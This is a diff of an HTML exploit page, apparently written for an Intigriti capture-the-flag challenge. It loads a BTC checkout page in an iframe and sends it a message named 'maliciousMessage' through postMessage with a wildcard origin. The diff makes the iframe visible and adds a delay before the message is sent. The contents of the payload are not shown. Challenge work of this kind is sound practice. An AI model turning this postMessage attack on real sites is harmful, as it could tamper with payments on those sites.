@@ -6,7 +6,7 @@
 <body>
     <h1>Processing...</h1>
 
-    <iframe id="victim-iframe" src="https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=45000" style="display:none;"></iframe>
+    <iframe id="victim-iframe" src="https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=45000" style="width: 800px; height: 600px; border: 1px solid black;"></iframe>
 
     <script>
         document.getElementById('victim-iframe').onload = function() {
@@ -33,9 +33,10 @@
             };
 
             const victimIframe = document.getElementById('victim-iframe').contentWindow;
-            victimIframe.postMessage(maliciousMessage, '*');
-
-            console.log("Malicious message with valid-format address sent.");
+            setTimeout(() => {
+                victimIframe.postMessage(maliciousMessage, '*');
+                console.log("Malicious message sent to iframe.");
+            }, 1000);
         };
     </script>
 </body>
